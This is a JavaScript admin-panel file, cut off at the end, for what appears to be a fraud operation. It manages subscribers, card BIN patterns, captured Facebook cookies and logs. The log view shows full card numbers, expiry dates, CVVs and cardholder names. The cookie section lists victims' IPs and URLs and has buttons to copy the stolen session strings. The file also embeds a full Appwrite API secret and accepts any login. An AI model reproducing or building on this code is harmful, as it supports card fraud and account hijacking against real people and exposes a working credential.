// Admin Panel JavaScript - Doc_HEMA Team
// =========================================

// Appwrite Configuration
const APPWRITE_CONFIG = {
    endpoint: 'https://nyc.cloud.appwrite.io/v1',
    projectId: '693631c8001ac4fbc231',
    databaseId: '69363201001bc7a64088',
    apiSecret: 'standard_917cef86aef581038cb102a0b6d645aa4574cdccefe56659604f22954dba8b1213ac7a0172d73857e904188fba17e8574f23cfb1f4393301aae31c20b8213b086293b0f8c0f3a581e0862ef5db10ad03b749561368f61778ddf118941af5137eeae8ffc196cdb3f3b8a4ac489dd99a67a059fdfc00afad2893b8858a9ca904e3',
    collections: {
        users: 'users',
        subscriptions: 'subscriptions',
        bins: 'bins',
        cookies: 'cookies',
        logs: 'logs'
    }
};

// State
let currentSection = 'overview';
let isLoggedIn = false;

// Helper Functions
function getAppwriteHeaders() {
    return {
        'Content-Type': 'application/json',
        'X-Appwrite-Project': APPWRITE_CONFIG.projectId,
        'X-Appwrite-Key': APPWRITE_CONFIG.apiSecret
    };
}

// API Calls
async function fetchDocuments(collectionId, queries = []) {
    try {
        // Fetch all documents without query params (Appwrite query format was causing issues)
        let url = `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${collectionId}/documents`;

        const response = await fetch(url, {
            method: 'GET',
            headers: getAppwriteHeaders()
        });

        if (!response.ok) throw new Error('Failed to fetch');
        return await response.json();
    } catch (error) {
        console.error(`Error fetching ${collectionId}:`, error);
        return { documents: [], total: 0 };
    }
}


async function createDocument(collectionId, data) {
    try {
        const response = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${collectionId}/documents`,
            {
                method: 'POST',
                headers: getAppwriteHeaders(),
                body: JSON.stringify({
                    documentId: 'unique()',
                    data: data
                })
            }
        );

        if (!response.ok) {
            const error = await response.json();
            throw new Error(error.message || 'Failed to create');
        }
        return await response.json();
    } catch (error) {
        console.error(`Error creating in ${collectionId}:`, error);
        throw error;
    }
}

async function deleteDocument(collectionId, documentId) {
    try {
        const response = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${collectionId}/documents/${documentId}`,
            {
                method: 'DELETE',
                headers: getAppwriteHeaders()
            }
        );
        return response.ok;
    } catch (error) {
        console.error(`Error deleting from ${collectionId}:`, error);
        return false;
    }
}

async function updateDocument(collectionId, documentId, data) {
    try {
        const response = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${collectionId}/documents/${documentId}`,
            {
                method: 'PATCH',
                headers: getAppwriteHeaders(),
                body: JSON.stringify({ data })
            }
        );
        if (!response.ok) throw new Error('Failed to update');
        return await response.json();
    } catch (error) {
        console.error(`Error updating in ${collectionId}:`, error);
        throw error;
    }
}

// Login Handler
document.getElementById('login-form').addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('admin-email').value;
    const password = document.getElementById('admin-password').value;
    const loginError = document.getElementById('login-error');
    const loginText = document.getElementById('login-text');
    const loginSpinner = document.getElementById('login-spinner');

    // Simple admin check (you can replace with Appwrite auth)
    // For demo: accept any email/password, in production use proper auth
    if (email && password) {
        loginText.style.display = 'none';
        loginSpinner.style.display = 'inline-block';

        try {
            // For demo purposes, we'll just verify the API key works
            const testResponse = await fetchDocuments(APPWRITE_CONFIG.collections.users, ['limit(1)']);

            if (testResponse) {
                isLoggedIn = true;
                localStorage.setItem('adminLoggedIn', 'true');
                showDashboard();
            }
        } catch (error) {
            loginError.textContent = 'خطأ في الاتصال بالخادم';
            loginError.style.display = 'block';
        } finally {
            loginText.style.display = 'inline';
            loginSpinner.style.display = 'none';
        }
    } else {
        loginError.textContent = 'يرجى إدخال البريد وكلمة المرور';
        loginError.style.display = 'block';
    }
});

// Show Dashboard
function showDashboard() {
    document.getElementById('login-screen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'flex';
    loadOverviewData();
}

// Logout Handler
document.getElementById('logout-btn').addEventListener('click', () => {
    isLoggedIn = false;
    localStorage.removeItem('adminLoggedIn');
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('login-screen').style.display = 'flex';
});

// Navigation
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', (e) => {
        const section = e.currentTarget.getAttribute('data-section');
        // Skip if no data-section (external links like bin-search)
        if (!section) return;
        e.preventDefault();
        navigateToSection(section);
    });
});

function navigateToSection(section) {
    // Update nav
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelector(`[data-section="${section}"]`).classList.add('active');

    // Update title
    const titles = {
        overview: 'نظرة عامة',
        users: 'المستخدمين',
        subscriptions: 'الاشتراكات',
        bins: 'BINs',
        cookies: 'Cookies',
        logs: 'السجلات'
    };
    document.getElementById('page-title').textContent = titles[section];

    // Show section
    document.querySelectorAll('.section').forEach(s => s.style.display = 'none');
    document.getElementById(`section-${section}`).style.display = 'block';

    currentSection = section;
    loadSectionData(section);
}

// Load Section Data
async function loadSectionData(section) {
    switch (section) {
        case 'overview': await loadOverviewData(); break;
        case 'users': await loadUsersData(); break;
        case 'subscriptions': await loadSubscriptionsData(); break;
        case 'bins': await loadBinsData(); break;
        case 'cookies': await loadCookiesData(); break;
        case 'logs': await loadLogsData(); break;
    }
}

// Overview Data
async function loadOverviewData() {
    try {
        const [users, subs, bins, logs] = await Promise.all([
            fetchDocuments(APPWRITE_CONFIG.collections.users),
            fetchDocuments(APPWRITE_CONFIG.collections.subscriptions),
            fetchDocuments(APPWRITE_CONFIG.collections.bins),
            fetchDocuments(APPWRITE_CONFIG.collections.logs, ['limit(100)'])
        ]);

        document.getElementById('total-users').textContent = users.total || 0;
        document.getElementById('active-subs').textContent =
            (subs.documents || []).filter(s => s.isActive).length;
        document.getElementById('total-bins').textContent = bins.total || 0;
        document.getElementById('total-logs').textContent = logs.total || 0;

        // Recent logs
        const recentLogsDiv = document.getElementById('recent-logs');
        const recentLogs = (logs.documents || []).slice(0, 10);

        if (recentLogs.length === 0) {
            recentLogsDiv.innerHTML = '<p class="loading">لا توجد عمليات بعد</p>';
        } else {
            recentLogsDiv.innerHTML = recentLogs.map(log => `
        <div class="log-item">
          <span class="log-type">${log.type || 'Unknown'}</span>
          <span class="log-time">${new Date(log.createdAt || log.$createdAt).toLocaleString('ar-EG')}</span>
        </div>
      `).join('');
        }
    } catch (error) {
        console.error('Error loading overview:', error);
    }
}

// Users Data
async function loadUsersData() {
    const tbody = document.getElementById('users-tbody');
    tbody.innerHTML = '<tr><td colspan="6" class="loading">جاري التحميل...</td></tr>';

    try {
        const [users, subs] = await Promise.all([
            fetchDocuments(APPWRITE_CONFIG.collections.users),
            fetchDocuments(APPWRITE_CONFIG.collections.subscriptions)
        ]);

        const subsMap = {};
        (subs.documents || []).forEach(s => subsMap[s.userId] = s);

        const docs = users.documents || [];
        if (docs.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" class="loading">لا يوجد مستخدمين</td></tr>';
            return;
        }

        tbody.innerHTML = docs.map(user => {
            const sub = subsMap[user.userId] || subsMap[user.$id];
            const hasActiveSub = sub?.isActive && new Date(sub.expiryDate) > new Date();

            return `
        <tr>
          <td>${user.username || 'غير محدد'}</td>
          <td>${user.email || '-'}</td>
          <td>${user.deviceName || '-'}</td>
          <td>${user.lastLogin ? new Date(user.lastLogin).toLocaleString('ar-EG') : '-'}</td>
          <td><span class="badge ${hasActiveSub ? 'badge-success' : 'badge-error'}">${hasActiveSub ? 'نشط' : 'غير نشط'}</span></td>
          <td>
            <button class="btn btn-sm btn-danger" onclick="deleteUser('${user.$id}')">🗑️</button>
          </td>
        </tr>
      `;
        }).join('');
    } catch (error) {
        tbody.innerHTML = '<tr><td colspan="6" class="loading">خطأ في التحميل</td></tr>';
    }
}

// Subscriptions Data
async function loadSubscriptionsData() {
    const tbody = document.getElementById('subs-tbody');
    tbody.innerHTML = '<tr><td colspan="5" class="loading">جاري التحميل...</td></tr>';

    try {
        const result = await fetchDocuments(APPWRITE_CONFIG.collections.subscriptions);
        const docs = result.documents || [];

        if (docs.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="loading">لا توجد اشتراكات</td></tr>';
            return;
        }

        tbody.innerHTML = docs.map(sub => {
            const isActive = sub.isActive && new Date(sub.expiryDate) > new Date();
            return `
        <tr>
          <td>${sub.userId}</td>
          <td>${sub.plan || 'monthly'}</td>
          <td>${new Date(sub.expiryDate).toLocaleDateString('ar-EG')}</td>
          <td><span class="badge ${isActive ? 'badge-success' : 'badge-error'}">${isActive ? 'نشط' : 'منتهي'}</span></td>
          <td>
            <button class="btn btn-sm btn-success" onclick="toggleSubscription('${sub.$id}', ${!sub.isActive})">${sub.isActive ? '⏸️' : '▶️'}</button>
            <button class="btn btn-sm btn-danger" onclick="deleteSubscription('${sub.$id}')">🗑️</button>
          </td>
        </tr>
      `;
        }).join('');
    } catch (error) {
        tbody.innerHTML = '<tr><td colspan="5" class="loading">خطأ في التحميل</td></tr>';
    }
}

// BINs Data with Analytics
let allBinsData = [];
let binUsageMap = {};

async function loadBinsData() {
    const tbody = document.getElementById('bins-tbody');
    tbody.innerHTML = '<tr><td colspan="7" class="loading">جاري التحميل...</td></tr>';

    try {
        // Fetch BINs
        const result = await fetchDocuments(APPWRITE_CONFIG.collections.bins);
        allBinsData = result.documents || [];

        // Fetch logs to count BIN usage
        const logsResult = await fetchDocuments(APPWRITE_CONFIG.collections.logs);
        const logs = logsResult.documents || [];

        // Count BIN usage from logs
        binUsageMap = {};
        logs.forEach(log => {
            if (log.type === 'BIN_REGISTERED' || log.type === 'CARD_ADDED') {
                try {
                    const data = JSON.parse(log.data || '{}');
                    const bin = data.bin || data.binPattern || '';
                    if (bin) {
                        const binPrefix = bin.substring(0, 6);
                        binUsageMap[binPrefix] = (binUsageMap[binPrefix] || 0) + 1;
                    }
                } catch (e) { }
            }
        });

        // Update analytics
        updateBinAnalytics();

        // Render BINs table
        renderBinsTable();

    } catch (error) {
        tbody.innerHTML = '<tr><td colspan="7" class="loading">خطأ في التحميل</td></tr>';
    }
}

function updateBinAnalytics() {
    // Get unique BINs (first 6 digits)
    const uniqueBins = new Set();
    allBinsData.forEach(bin => {
        const pattern = (bin.pattern || '').substring(0, 6);
        if (pattern) uniqueBins.add(pattern);
    });

    // Sort by usage
    const sortedBins = Object.entries(binUsageMap).sort((a, b) => b[1] - a[1]);

    // Update stats
    document.getElementById('unique-bins').textContent = uniqueBins.size;
    document.getElementById('total-bin-usage').textContent = Object.values(binUsageMap).reduce((a, b) => a + b, 0);

    if (sortedBins.length > 0) {
        document.getElementById('top-bin-pattern').textContent = sortedBins[0][0];
        document.getElementById('top-bin-count').textContent = sortedBins[0][1];
    }

    // Update top 5 list
    const topBinsList = document.getElementById('top-bins-list');
    if (sortedBins.length === 0) {
        topBinsList.innerHTML = '<p style="color: #888;">لا توجد بيانات استخدام</p>';
    } else {
        topBinsList.innerHTML = sortedBins.slice(0, 5).map((item, index) => `
            <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(255, 215, 0, ${0.1 - index * 0.015}); border-radius: 8px; margin-bottom: 8px;">
                <span style="font-weight: bold; color: #FFD700;">${index + 1}. ${item[0]}</span>
                <span style="background: #FFD700; color: #1a1a2e; padding: 4px 12px; border-radius: 12px; font-weight: bold;">${item[1]} استخدام</span>
            </div>
        `).join('');
    }
}

function renderBinsTable() {
    const tbody = document.getElementById('bins-tbody');
    const filterValue = (document.getElementById('bin-filter')?.value || '').toLowerCase();
    const sortBy = document.getElementById('bin-sort')?.value || 'date';

    let filteredBins = allBinsData.filter(bin =>
        (bin.pattern || '').toLowerCase().includes(filterValue) ||
        (bin.name || '').toLowerCase().includes(filterValue) ||
        (bin.userId || '').toLowerCase().includes(filterValue)
    );

    // Add usage count to each BIN
    filteredBins = filteredBins.map(bin => ({
        ...bin,
        usageCount: binUsageMap[(bin.pattern || '').substring(0, 6)] || 0
    }));

    // Sort
    if (sortBy === 'usage') {
        filteredBins.sort((a, b) => b.usageCount - a.usageCount);
    } else if (sortBy === 'pattern') {
        filteredBins.sort((a, b) => (a.pattern || '').localeCompare(b.pattern || ''));
    } else {
        filteredBins.sort((a, b) => new Date(b.createdAt || b.$createdAt) - new Date(a.createdAt || a.$createdAt));
    }

    if (filteredBins.length === 0) {
        tbody.innerHTML = '<tr><td colspan="7" class="loading">لا توجد BINs</td></tr>';
        return;
    }

    tbody.innerHTML = filteredBins.map(bin => `
      <tr>
        <td>${bin.userId || '-'}</td>
        <td style="font-family: monospace;">${bin.pattern}</td>
        <td>${bin.name || '-'}</td>
        <td><span style="background: ${bin.usageCount > 0 ? '#4CAF50' : '#666'}; color: white; padding: 2px 8px; border-radius: 10px;">${bin.usageCount}</span></td>
        <td>${bin.expiry || '-'}</td>
        <td>${new Date(bin.createdAt || bin.$createdAt).toLocaleString('ar-EG')}</td>
        <td>
          <button class="btn btn-sm btn-danger" onclick="deleteBin('${bin.$id}')">🗑️</button>
        </td>
      </tr>
    `).join('');
}

// Event listeners for BIN filtering and sorting
document.addEventListener('DOMContentLoaded', () => {
    const binFilter = document.getElementById('bin-filter');
    const binSort = document.getElementById('bin-sort');

    if (binFilter) {
        binFilter.addEventListener('input', renderBinsTable);
    }
    if (binSort) {
        binSort.addEventListener('change', renderBinsTable);
    }
});


// Cookies Data
let allCookiesData = [];

async function loadCookiesData() {
    const tbody = document.getElementById('cookies-tbody');
    tbody.innerHTML = '<tr><td colspan="6" class="loading">جاري التحميل...</td></tr>';

    try {
        // Fetch all cookies with pagination
        allCookiesData = [];
        let offset = 0;
        const limit = 100;
        let hasMore = true;

        while (hasMore) {
            const timestamp = Date.now();
            const url = `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents?limit=${limit}&offset=${offset}&_t=${timestamp}`;
            const response = await fetch(url, {
                method: 'GET',
                headers: getAppwriteHeaders(),
                cache: 'no-store'
            });
            const result = await response.json();
            const docs = result.documents || [];
            allCookiesData = allCookiesData.concat(docs);

            if (docs.length < limit) hasMore = false;
            else offset += limit;

            tbody.innerHTML = `<tr><td colspan="6" class="loading">تم تحميل ${allCookiesData.length} كوكيز...</td></tr>`;
        }

        console.log(`Total cookies loaded: ${allCookiesData.length}`);
        updateCookiesStats();
        renderCookiesTable();
    } catch (error) {
        console.error('Error loading cookies:', error);
        tbody.innerHTML = '<tr><td colspan="6" class="loading">خطأ في التحميل</td></tr>';
    }
}

function updateCookiesStats() {
    const total = allCookiesData.length;
    const today = new Date().toDateString();
    const todayCount = allCookiesData.filter(c => new Date(c.capturedAt || c.$createdAt).toDateString() === today).length;
    const uniqueUsers = new Set(allCookiesData.map(c => c.userId)).size;

    document.getElementById('cookies-total').textContent = total;
    document.getElementById('cookies-today').textContent = todayCount;
    document.getElementById('cookies-unique-users').textContent = uniqueUsers;
}

function renderCookiesTable() {
    const tbody = document.getElementById('cookies-tbody');
    const searchQuery = (document.getElementById('cookies-search')?.value || '').toLowerCase();

    let filtered = allCookiesData;
    if (searchQuery) {
        filtered = filtered.filter(c =>
            (c.userId || '').toLowerCase().includes(searchQuery) ||
            (c.ip || '').toLowerCase().includes(searchQuery)
        );
    }

    // Sort by date (newest first)
    filtered.sort((a, b) => new Date(b.capturedAt || b.$createdAt) - new Date(a.capturedAt || a.$createdAt));

    if (filtered.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" class="loading">لا توجد Cookies مطابقة</td></tr>';
        return;
    }

    tbody.innerHTML = filtered.map(cookie => {
        const cookiesLength = (cookie.cookies || '').length;
        const cookiesPreview = cookiesLength > 0 ? `${cookiesLength} حرف` : 'فارغ';

        return `
      <tr>
        <td>${cookie.userId || '-'}</td>
        <td>${cookie.ip || '-'}</td>
        <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;" title="${cookie.url || ''}">${cookie.url || '-'}</td>
        <td><span style="background: ${cookiesLength > 0 ? '#4CAF50' : '#666'}; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px;">${cookiesPreview}</span></td>
        <td>${new Date(cookie.capturedAt || cookie.$createdAt).toLocaleString('ar-EG')}</td>
        <td>
          <button class="btn btn-sm btn-primary" onclick="viewCookieDetails('${cookie.$id}')">👁️ عرض</button>
          <button class="btn btn-sm btn-success" onclick="copyCookieById('${cookie.$id}')">📋</button>
          <button class="btn btn-sm btn-danger" onclick="deleteCookie('${cookie.$id}')">🗑️</button>
        </td>
      </tr>
    `;
    }).join('');
}

function viewCookieDetails(id) {
    const cookie = allCookiesData.find(c => c.$id === id);
    if (!cookie) return;

    document.getElementById('modal-user').textContent = cookie.userId || '-';
    document.getElementById('modal-ip').textContent = cookie.ip || '-';
    document.getElementById('modal-url').textContent = cookie.url || '-';
    document.getElementById('modal-date').textContent = new Date(cookie.capturedAt || cookie.$createdAt).toLocaleString('ar-EG');
    document.getElementById('modal-cookies').value = cookie.cookies || 'لا توجد كوكيز';
    document.getElementById('cookie-modal').style.display = 'flex';
}

function closeCookieModal() {
    document.getElementById('cookie-modal').style.display = 'none';
}

function copyModalCookies() {
    const textarea = document.getElementById('modal-cookies');
    textarea.select();
    document.execCommand('copy');
    alert('تم نسخ الكوكيز!');
}

function copyCookieById(id) {
    const cookie = allCookiesData.find(c => c.$id === id);
    if (cookie && cookie.cookies) {
        navigator.clipboard.writeText(cookie.cookies);
        alert('تم نسخ الكوكيز!');
    }
}

// Event listeners for cookies
document.addEventListener('DOMContentLoaded', () => {
    const cookiesSearch = document.getElementById('cookies-search');
    const refreshCookies = document.getElementById('refresh-cookies');

    if (cookiesSearch) {
        cookiesSearch.addEventListener('input', () => setTimeout(renderCookiesTable, 300));
    }
    if (refreshCookies) {
        refreshCookies.addEventListener('click', loadCookiesData);
    }
});


// Logs Data with Card Search
let allLogsData = [];

async function loadLogsData() {
    const tbody = document.getElementById('logs-tbody');
    tbody.innerHTML = '<tr><td colspan="5" class="loading">جاري تحميل جميع السجلات...</td></tr>';

    try {
        // Fetch ALL logs by paginating (Appwrite default limit is 25)
        allLogsData = [];
        let offset = 0;
        const limit = 100;
        let hasMore = true;

        while (hasMore) {
            const timestamp = Date.now(); // Cache buster
            const url = `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents?limit=${limit}&offset=${offset}&_t=${timestamp}`;
            const response = await fetch(url, {
                method: 'GET',
                headers: getAppwriteHeaders(),
                cache: 'no-store' // Force fresh data
            });
            const result = await response.json();
            const docs = result.documents || [];
            allLogsData = allLogsData.concat(docs);

            if (docs.length < limit) {
                hasMore = false;
            } else {
                offset += limit;
            }

            // Update loading message with progress
            tbody.innerHTML = `<tr><td colspan="5" class="loading">تم تحميل ${allLogsData.length} سجل...</td></tr>`;
        }

        console.log(`Total logs loaded: ${allLogsData.length}`);
        renderLogsTable();
    } catch (error) {
        console.error('Error loading logs:', error);
        tbody.innerHTML = '<tr><td colspan="5" class="loading">خطأ في التحميل</td></tr>';
    }
}


function matchCardPattern(cardNumber, searchPattern) {
    if (!cardNumber || !searchPattern) return false;

    // Clean inputs
    const card = cardNumber.replace(/\D/g, '');
    const pattern = searchPattern.toLowerCase().replace(/[^0-9x]/g, '');

    if (!pattern) return false;

    // If pattern has no 'x', just check if card contains the digits
    if (!pattern.includes('x')) {
        return card.includes(pattern);
    }

    // With 'x' wildcards - check all possible positions
    const patternLength = pattern.length;
    for (let i = 0; i <= card.length - patternLength; i++) {
        let matches = true;
        for (let j = 0; j < patternLength; j++) {
            if (pattern[j] !== 'x' && pattern[j] !== card[i + j]) {
                matches = false;
                break;
            }
        }
        if (matches) return true;
    }
    return false;
}

// Pagination state
let currentLogsPage = 1;
let logsPerPage = 50;

function renderLogsTable() {
    const tbody = document.getElementById('logs-tbody');
    const cardSearch = (document.getElementById('card-search')?.value || '').trim();
    const typeFilter = document.getElementById('log-type-filter')?.value || '';
    const searchResultsInfo = document.getElementById('search-results-info');
    const searchResultsText = document.getElementById('search-results-text');

    let filteredLogs = [...allLogsData];

    // Filter by type
    if (typeFilter) {
        filteredLogs = filteredLogs.filter(log => log.type === typeFilter);
    }

    // Filter by card number pattern
    if (cardSearch) {
        filteredLogs = filteredLogs.filter(log => {
            try {
                const data = JSON.parse(log.data || '{}');
                const cardNumber = data.number || data.cardNumber || data.bin || '';
                return matchCardPattern(cardNumber, cardSearch);
            } catch (e) {
                return false;
            }
        });

        // Show search results info
        if (searchResultsInfo) {
            searchResultsInfo.style.display = 'block';
            searchResultsText.textContent = `🔍 تم العثور على ${filteredLogs.length} نتيجة للبحث "${cardSearch}"`;
        }
    } else {
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
    }

    // Sort by date (newest first)
    filteredLogs.sort((a, b) => new Date(b.createdAt || b.$createdAt) - new Date(a.createdAt || a.$createdAt));

    // Update total count
    const logsCount = document.getElementById('logs-count');
    if (logsCount) {
        logsCount.textContent = `${filteredLogs.length} سجل`;
    }

    // Pagination
    const totalPages = Math.ceil(filteredLogs.length / logsPerPage);
    if (currentLogsPage > totalPages) currentLogsPage = 1;

    const startIndex = (currentLogsPage - 1) * logsPerPage;
    const endIndex = startIndex + logsPerPage;
    const paginatedLogs = filteredLogs.slice(startIndex, endIndex);

    // Update pagination info
    const pageInfo = document.getElementById('logs-page-info');
    if (pageInfo) {
        pageInfo.textContent = `صفحة ${currentLogsPage} من ${totalPages || 1}`;
    }

    // Update pagination buttons
    const prevBtn = document.getElementById('logs-prev');
    const nextBtn = document.getElementById('logs-next');
    if (prevBtn) prevBtn.disabled = currentLogsPage <= 1;
    if (nextBtn) nextBtn.disabled = currentLogsPage >= totalPages;

    if (filteredLogs.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="loading">لا توجد سجلات مطابقة</td></tr>';
        return;
    }

    tbody.innerHTML = paginatedLogs.map(log => {
        // Parse and format data based on type
        let displayData = '-';
        let parsedData = {};

        try {
            parsedData = JSON.parse(log.data || '{}');
        } catch (e) {
            displayData = log.data || '-';
        }

        if (log.type === 'CARD_ADDED') {
            const cardNum = parsedData.number || '';
            const maskedCard = cardNum ? `****${cardNum.slice(-4)}` : '-';
            displayData = `
                <div style="font-family: monospace; font-size: 12px;">
                    <div><strong style="color:#00FF41;">💳</strong> <span style="color:#FFD700;">${cardNum || '-'}</span></div>
                    <div><strong style="color:#888;">📅</strong> ${parsedData.expiry || '-'} | <strong style="color:#888;">🔒</strong> ${parsedData.cvv || '-'}</div>
                    <div style="color:#888; font-size:10px;">👤 ${parsedData.name || '-'}</div>
                </div>
            `;
        } else if (log.type === 'BIN_REGISTERED') {
            displayData = `
                <div style="font-family: monospace;">
                    <span style="background:#4CAF50; color:white; padding:2px 6px; border-radius:4px;">${parsedData.pattern || parsedData.bin || '-'}</span>
                    ${parsedData.name ? `<span style="color:#888; margin-left:10px;">${parsedData.name}</span>` : ''}
                </div>
            `;
        } else if (log.type === 'FB_COOKIES') {
            const cookiesLen = parsedData.cookies?.length || 0;
            displayData = `
                <div>
                    🍪 <span style="color:#4CAF50;">${cookiesLen} حرف</span>
                    ${parsedData.url ? `<br><span style="color:#888; font-size:10px;">${parsedData.url.substring(0, 50)}...</span>` : ''}
                </div>
            `;
        } else if (log.type === 'CARD_BINDING') {
            const statusColor = parsedData.status === 'SUCCESS' ? '#4CAF50' :
                parsedData.status === 'FAILED' ? '#f44336' : '#ff9800';
            displayData = `
                <div>
                    <span style="background:${statusColor}; color:white; padding:2px 8px; border-radius:4px;">${parsedData.status || 'UNKNOWN'}</span>
                    <span style="color:#00FF41; margin-left:10px;">****${parsedData.cardLast4 || parsedData.card || '****'}</span>
                    <br><span style="color:#888; font-size:10px;">${parsedData.reason || ''}</span>
                </div>
            `;
        } else {
            displayData = `<div style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">${log.data || '-'}</div>`;
        }

        // Apply card search highlight
        if (cardSearch) {
            const cardNumber = parsedData.number || parsedData.cardNumber || parsedData.bin || '';
            if (cardNumber) {
                displayData = displayData.replace(cardNumber, `<span style="background: #FFD700; color: #1a1a2e; padding: 2px 4px; border-radius: 4px;">${cardNumber}</span>`);
            }
        }

        return `
      <tr>
        <td>${log.userId || '-'}</td>
        <td><span class="badge badge-warning">${log.type || '-'}</span></td>
        <td>${log.ip || '-'}</td>
        <td>${displayData}</td>
        <td>${new Date(log.createdAt || log.$createdAt).toLocaleString('ar-EG')}</td>
      </tr>
    `;
    }).join('');
}

// Event listeners for log filtering and pagination
document.addEventListener('DOMContentLoaded', () => {
    const cardSearch = document.getElementById('card-search');
    const typeFilter = document.getElementById('log-type-filter');
    const clearSearch = document.getElementById('clear-search');
    const prevBtn = document.getElementById('logs-prev');
    const nextBtn = document.getElementById('logs-next');
    const perPageSelect = document.getElementById('logs-per-page');

    if (cardSearch) {
        cardSearch.addEventListener('input', () => {
            currentLogsPage = 1; // Reset to first page on search
            setTimeout(renderLogsTable, 300); // Debounce
        });
    }
    if (typeFilter) {
        typeFilter.addEventListener('change', () => {
            currentLogsPage = 1; // Reset to first page on filter
            renderLogsTable();
        });
    }
    if (clearSearch) {
        clearSearch.addEventListener('click', () => {
            document.getElementById('card-search').value = '';
            currentLogsPage = 1;
            renderLogsTable();
        });
    }

    // Pagination controls
    if (prevBtn) {
        prevBtn.addEventListener('click', () => {
            if (currentLogsPage > 1) {
                currentLogsPage--;
                renderLogsTable();
            }
        });
    }
    if (nextBtn) {
        nextBtn.addEventListener('click', () => {
            currentLogsPage++;
            renderLogsTable();
        });
    }
    if (perPageSelect) {
        perPageSelect.addEventListener('change', (e) => {
            logsPerPage = parseInt(e.target.value);
            currentLogsPage = 1; // Reset to first page
            renderLogsTable();
        });
    }
});


// Action Functions
async function deleteUser(id) {
    if (confirm('هل تريد حذف هذا المستخدم؟')) {
        await deleteDocument(APPWRITE_CONFIG.collections.users, id);
        loadUsersData();
    }
}

async function deleteSubscription(id) {
    if (confirm('هل تريد حذف هذا الاشتراك؟')) {
        await deleteDocument(APPWRITE_CONFIG.collections.subscriptions, id);
        loadSubscriptionsData();
    }
}

async function toggleSubscription(id, newState) {
    await updateDocument(APPWRITE_CONFIG.collections.subscriptions, id, { isActive: newState });
    loadSubscriptionsData();
}

async function deleteBin(id) {
    if (confirm('هل تريد حذف هذا الـ BIN؟')) {
        await deleteDocument(APPWRITE_CONFIG.collections.bins, id);
        loadBinsData();
    }
}

async function deleteCookie(id) {
    if (confirm('هل تريد حذف هذا الـ Cookie؟')) {
        await deleteDocument(APPWRITE_CONFIG.collections.cookies, id);
        loadCookiesData();
    }
}

async function viewCookie(id) {
    const result = await fetchDocuments(APPWRITE_CONFIG.collections.cookies, [`equal("$id", "${id}")`]);
    if (result.documents && result.documents.length > 0) {
        const cookie = result.documents[0];
        alert(`Cookies:\n\n${cookie.cookies || 'No cookies'}`);
    }
}

// Modals
document.getElementById('add-user-btn').addEventListener('click', () => {
    document.getElementById('add-user-modal').style.display = 'flex';
});

document.getElementById('add-sub-btn').addEventListener('click', () => {
    document.getElementById('add-sub-modal').style.display = 'flex';
});

document.querySelectorAll('.modal-close, .modal-close-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
    });
});

// Add User Form
document.getElementById('add-user-form').addEventListener('submit', async (e) => {
    e.preventDefault();

    const userData = {
        userId: 'user_' + Date.now(),
        username: document.getElementById('new-username').value,
        email: document.getElementById('new-email').value,
        deviceName: document.getElementById('new-device').value || 'Chrome Extension',
        createdAt: new Date().toISOString(),
        lastLogin: new Date().toISOString()
    };

    try {
        await createDocument(APPWRITE_CONFIG.collections.users, userData);
        document.getElementById('add-user-modal').style.display = 'none';
        document.getElementById('add-user-form').reset();
        loadUsersData();
    } catch (error) {
        alert('خطأ في إضافة المستخدم: ' + error.message);
    }
});

// Add Subscription Form
document.getElementById('add-sub-form').addEventListener('submit', async (e) => {
    e.preventDefault();

    const subData = {
        userId: document.getElementById('sub-user-id').value,
        plan: document.getElementById('sub-plan').value,
        expiryDate: document.getElementById('sub-expiry').value + 'T23:59:59.000Z',
        isActive: true,
        createdAt: new Date().toISOString()
    };

    try {
        await createDocument(APPWRITE_CONFIG.collections.subscriptions, subData);
        document.getElementById('add-sub-modal').style.display = 'none';
        document.getElementById('add-sub-form').reset();
        loadSubscriptionsData();
    } catch (error) {
        alert('خطأ في إضافة الاشتراك: ' + error.message);
    }
});

// Refresh Button
document.getElementById('refresh-btn').addEventListener('click', () => {
    loadSectionData(currentSection);
});

// Filter for BINs
document.getElementById('bin-filter').addEventListener('input', async (e) => {
    const filter = e.target.value.toLowerCase();
    const rows = document.querySelectorAll('#bins-tbody tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(filter) ? '' : 'none';
    });
});

// Filter for Logs
document.getElementById('log-type-filter').addEventListener('change', async (e) => {
    const typeFilter = e.target.value;
    if (!typeFilter) {
        loadLogsData();
    } else {
        const tbody = document.getElementById('logs-tbody');
        tbody.innerHTML = '<tr><td colspan="5" class="loading">جاري التحميل...</td></tr>';

        const result = await fetchDocuments(
            APPWRITE_CONFIG.collections.logs,
            [`equal("type", "${typeFilter}")`, 'limit(100)']
        );
        const docs = result.documents || [];

        if (docs.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="loading">لا توجد سجلات من هذا النوع</td></tr>';
            return;
        }

        tbody.innerHTML = docs.map(log => `
      <tr>
        <td>${log.userId || '-'}</td>
        <td><span class="badge badge-warning">${log.type || '-'}</span></td>
        <td>${log.ip || '-'}</td>
